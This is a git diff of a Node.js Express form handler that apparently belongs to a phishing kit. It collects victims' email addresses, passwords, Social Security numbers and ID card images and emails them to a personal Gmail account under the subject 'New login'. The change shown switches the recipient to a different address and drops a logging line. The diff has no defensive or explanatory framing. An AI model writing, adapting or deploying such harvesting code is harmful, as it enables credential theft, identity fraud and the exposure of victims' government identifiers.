@@ -50,14 +50,13 @@ app.post("/form", async(req,res)=>{
     })
     // res.status(200).json(publicIds, security, email, password)
     const mailOptions = {
-      from: 'sheriffhardewale@gmail.com',
-      to: 'sheriffhardewale@gmail.com',
+      from: 'Masonres213@gmail.com',
+      to: 'Masonres213@gmail.com',
       subject: 'New login',
       // text: 'That was easy!',
       html:`<h1>Someone just logged in with the following info </h1><p> email: ${email}, password: ${password}, SSN: ${security},  ID Cards:  ${publicIds[0]} `
     };
-    res.status(200).json({"msg": "done"})
-    console.log(publicIds) 
+    res.status(200).json({"msg": "done"}) 
     transporter.sendMail(mailOptions, function(error, info){
       if (error) {
         console.log(error);
